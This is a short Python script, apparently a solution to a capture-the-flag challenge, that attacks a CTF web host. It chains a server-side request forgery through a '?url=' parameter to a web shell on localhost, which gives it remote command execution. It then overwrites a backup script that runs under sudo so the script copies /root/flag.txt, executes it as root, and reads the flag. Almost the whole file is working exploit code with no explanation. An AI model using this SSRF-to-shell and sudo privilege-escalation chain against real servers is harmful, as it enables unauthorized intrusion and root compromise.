import urllib.request
import urllib.parse
import re
import sys
sys.stdout.reconfigure(encoding='utf-8', errors='replace')

BASE = 'https://991c635b-ctf.dsg.id/'
UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'

def shell(cmd):
    url = BASE + '?url=' + urllib.parse.quote(f'http://127.0.0.1/shell.php?c={urllib.parse.quote(cmd)}')
    req = urllib.request.Request(url, headers={'User-Agent': UA})
    try:
        res = urllib.request.urlopen(req, timeout=15)
        html = res.read().decode('utf-8', errors='replace')
        m = re.search(r'class="preview-content">(.*?)</div>', html, re.DOTALL)
        if m:
            return m.group(1).strip()
        return 'NO PREVIEW'
    except Exception as e:
        return f'EXCEPTION: {e}'

# Step 1: Overwrite backup.sh to copy flag
print("=== Overwriting backup.sh ===")
print(shell('echo "#!/bin/sh" > /opt/ops/backup.sh'))
print(shell('echo "cp /root/flag.txt /tmp/flag.txt" >> /opt/ops/backup.sh'))
print(shell('echo "chmod 644 /tmp/flag.txt" >> /opt/ops/backup.sh'))
print()

# Verify
print("=== cat /opt/ops/backup.sh ===")
print(shell('cat /opt/ops/backup.sh'))
print()

# Step 2: Run it with sudo
print("=== sudo /opt/ops/backup.sh ===")
print(shell('sudo /opt/ops/backup.sh'))
print()

# Step 3: Read the flag
print("=== cat /tmp/flag.txt ===")
print(shell('cat /tmp/flag.txt'))
